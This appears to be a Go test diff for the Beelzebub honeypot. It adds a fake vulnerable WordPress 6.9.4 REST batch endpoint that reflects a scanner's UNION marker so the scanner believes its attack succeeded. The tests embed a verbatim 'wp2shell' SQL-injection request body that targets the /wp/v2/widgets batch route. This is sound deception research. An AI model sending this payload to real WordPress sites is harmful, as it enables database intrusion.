@@ -1,7 +1,9 @@
 package plugins
 
 import (
+	"encoding/json"
 	"regexp"
+	"strings"
 	"testing"
 
 	"github.com/beelzebub-labs/beelzebub/v3/internal/parser"
@@ -237,5 +239,111 @@ func TestMirror_ParserValidatesJSON(t *testing.T) {
 	}}
 	if err := bad.CompileCommandRegex(); err == nil {
 		t.Fatalf("expected invalid-JSON body to fail config load")
+	}
+}
+
+// wpVulnMirror is the VULNERABLE-6.9.4 rule table: recurse nested batches and
+// reflect a wp2shell UNION marker into the forged row, so a marker-checking
+// scanner sees "success" and proceeds to its next stage. Byte-exact target =
+// tools/oracle-diff/wordpress-6.9.4/exploit_B_union_marker.txt (honeypot-research).
+func wpVulnMirror() *parser.MirrorConfig {
+	el := func(status int, body, headers string) parser.MirrorElement {
+		return parser.MirrorElement{Status: status, Body: body, Headers: headers}
+	}
+	rule := func(re, method string, e parser.MirrorElement) parser.MirrorRule {
+		return parser.MirrorRule{PathRegexStr: re, PathRegex: regexp.MustCompile(re), Method: method, MirrorElement: e}
+	}
+	parse := `{"code":"parse_path_failed","message":"Could not parse the path.","data":{"status":400}}`
+	notAllowed := `{"code":"rest_batch_not_allowed","message":"The requested route does not support batch requests.","data":{"status":400}}`
+	invalidHandler := `{"code":"rest_invalid_handler","message":"The handler for the route is invalid","data":{"status":500}}`
+	forged := `[{"id":1922721457,"guid":{"rendered":""},"slug":"${reflect}","title":{"rendered":""},"content":{"rendered":"","protected":false}}]`
+	rowHdr := `{"X-WP-Total":1,"X-WP-TotalPages":-1,"Allow":"GET"}`
+	markerRe := `COALESCE(?:%28|\()(?:%28|\()SELECT(?:%2B|\+| )0x([0-9a-fA-F]+)`
+
+	widgetsMarker := rule(`/wp/v2/widgets.*COALESCE`, "", el(200, forged, rowHdr))
+	widgetsMarker.Reflect = &parser.MirrorReflect{FromRegexStr: markerRe, FromRegex: regexp.MustCompile(markerRe), Decode: "hex"}
+
+	return &parser.MirrorConfig{
+		RequestKey: "requests", ResponseKey: "responses", WrapStatus: 207,
+		PathField: "path", MethodField: "method", MaxItems: 25,
+		Recurse: &parser.MirrorRecurse{Status: 207, Headers: `{"Allow":"POST"}`},
+		Rules: []parser.MirrorRule{
+			rule(`^https?:`, "", el(400, parse, `[]`)),
+			widgetsMarker,
+			rule(`/wp/v2/widgets.*WHERE(?:%28|\()(?:%20| )*1%3D1`, "", el(200, `[{"id":1922721457}]`, rowHdr)),
+			rule(`/wp/v2/widgets.*WHERE(?:%28|\()(?:%20| )*1%3D2`, "", el(200, `[]`, `{"X-WP-Total":0,"X-WP-TotalPages":0,"Allow":"GET"}`)),
+			rule(`/wp/v2/posts$`, "GET", el(500, invalidHandler, `[]`)),
+			rule(`/wp/v2/posts$`, "POST", el(401, `{"code":"rest_cannot_create","message":"Sorry, you are not allowed to create posts as this user.","data":{"status":401}}`, `{"Allow":"GET"}`)),
+			// vulnerable 6.9.4 returns [] here (patched 6.9.5 returns {"Allow":"POST"})
+			rule(`/batch/v1$`, "", el(400, notAllowed, `[]`)),
+		},
+		Default: el(404, `{"code":"rest_no_route","message":"No route was found matching the URL and request method.","data":{"status":404}}`, `[]`),
+	}
+}
+
+// the verbatim wp2shell B1 request body (marker 35667ba4eb25), and B2 (c94504763929)
+func wp2shellBody(markerHex string) string {
+	return `{"requests":[{"method":"POST","path":"http://:"},{"body":{"requests":[{"method":"GET","path":"http://:"},{"method":"GET","path":"/wp/v2/widgets?_fields=id%2Cslug%2Ctitle%2Ccontent%2Cguid&author_exclude=1%29+AND+1%3D0+UNION+ALL+SELECT+1922721457%2C1%2C0x30%2C0x30%2C%27%27%2C%27%27%2C%27%27%2C0x7075626c697368%2C0x636c6f736564%2C0x636c6f736564%2C%27%27%2CCOALESCE%28%28SELECT+0x` + markerHex + `%29%2C%27%27%29%2C%27%27%2C%27%27%2C0x30%2C0x30%2C%27%27%2C0%2C%27%27%2C0%2C0x706f7374%2C%27%27%2C0+--+-&context=view&orderby=none&page=-1&per_page=-1"},{"method":"GET","path":"/wp/v2/posts"}]},"method":"POST","path":"/wp/v2/posts"},{"method":"POST","path":"/batch/v1"}]}`
+}
+
+func TestMirror_VulnReproduction_ByteExact(t *testing.T) {
+	// marker 35667ba4eb25 hex-encoded == 0x333536363762613465623235
+	body := wp2shellBody("333536363762613465623235")
+	want := `{"responses":[{"body":{"code":"parse_path_failed","message":"Could not parse the path.","data":{"status":400}},"status":400,"headers":[]},{"body":{"responses":[{"body":{"code":"parse_path_failed","message":"Could not parse the path.","data":{"status":400}},"status":400,"headers":[]},{"body":[{"id":1922721457,"guid":{"rendered":""},"slug":"35667ba4eb25","title":{"rendered":""},"content":{"rendered":"","protected":false}}],"status":200,"headers":{"X-WP-Total":1,"X-WP-TotalPages":-1,"Allow":"GET"}},{"body":{"code":"rest_invalid_handler","message":"The handler for the route is invalid","data":{"status":500}},"status":500,"headers":[]}]},"status":207,"headers":{"Allow":"POST"}},{"body":{"code":"rest_batch_not_allowed","message":"The requested route does not support batch requests.","data":{"status":400}},"status":400,"headers":[]}]}`
+	status, got, ok := MirrorRespond(wpVulnMirror(), []byte(body))
+	if !ok || status != 207 {
+		t.Fatalf("ok=%v status=%d", ok, status)
+	}
+	if got != want {
+		t.Fatalf("byte mismatch\n got: %s\nwant: %s", got, want)
+	}
+}
+
+func TestMirror_VulnReflection_IsDynamicNotHardcoded(t *testing.T) {
+	// A DIFFERENT marker (c94504763929) must reflect that value, not a constant.
+	status, got, ok := MirrorRespond(wpVulnMirror(), []byte(wp2shellBody("633934353034373633393239")))
+	if !ok || status != 207 {
+		t.Fatalf("ok=%v status=%d", ok, status)
+	}
+	if !strings.Contains(got, `"slug":"c94504763929"`) {
+		t.Fatalf("expected reflected marker c94504763929 in slug, got: %s", got)
+	}
+	if strings.Contains(got, "35667ba4eb25") {
+		t.Fatalf("stale/hardcoded marker leaked")
+	}
+}
+
+func TestMirror_VulnReflection_HostileMarkerIsSafe(t *testing.T) {
+	// A marker that hex-decodes to JSON-breaking bytes must be escaped, keeping
+	// the response valid JSON (no injection via the reflection).
+	// 0x22 = '"'  -> would break the string if not escaped.
+	status, got, ok := MirrorRespond(wpVulnMirror(), []byte(wp2shellBody("22")))
+	if !ok || status != 207 {
+		t.Fatalf("ok=%v status=%d", ok, status)
+	}
+	var v any
+	if err := json.Unmarshal([]byte(got), &v); err != nil {
+		t.Fatalf("reflection broke JSON validity: %v\n%s", err, got)
+	}
+}
+
+func TestMirror_VulnRecursion_DepthAndBudgetBounded(t *testing.T) {
+	// A pathological deeply-nested body must not amplify unboundedly; it falls
+	// back (ok=false) once the element budget is exhausted.
+	cfg := wpVulnMirror()
+	cfg.MaxTotal = 5
+	// one node recursing into a WIDE nested array (30 leaves) — 1 + 30 > budget,
+	// within maxDepth — so the element budget, not the depth cap, stops it.
+	leaves := ""
+	for i := 0; i < 30; i++ {
+		if i > 0 {
+			leaves += ","
+		}
+		leaves += `{"method":"POST","path":"/x"}`
+	}
+	body := `{"requests":[{"method":"POST","path":"/wp/v2/posts","body":{"requests":[` + leaves + `]}}]}`
+	_, _, ok := MirrorRespond(cfg, []byte(body))
+	if ok {
+		t.Fatalf("expected ok=false (budget exhausted) for pathological nesting")
 	}
 }
